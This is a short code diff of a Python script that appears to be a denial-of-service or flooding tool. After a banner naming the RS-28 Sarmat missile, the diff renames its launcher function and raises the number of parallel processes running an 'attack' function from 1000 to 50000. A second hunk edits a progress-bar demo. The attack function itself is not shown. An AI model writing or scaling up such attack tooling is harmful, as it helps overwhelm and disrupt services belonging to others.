@@ -27,7 +27,7 @@ def progressbar(it, prefix="", size=60, file=sys.stdout):
     
 import time
 
-for i in progressbar(range(10), "Barra Util: ", 40):
+for i in progressbar(range(100), "Barra Util: ", 40):
     time.sleep(0.3)
     
     
@@ -77,11 +77,11 @@ print("[>>>] RS-28 Sarmat [<<<]")
 sleep(1)
 
 	
-def send2attack():
-  for i in range(1000): #Magic Power
+def send3attack():
+  for i in range(50000): #Magic Power
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp.start() #Magic Starts
 
     
-send2attack()
+send3attack()
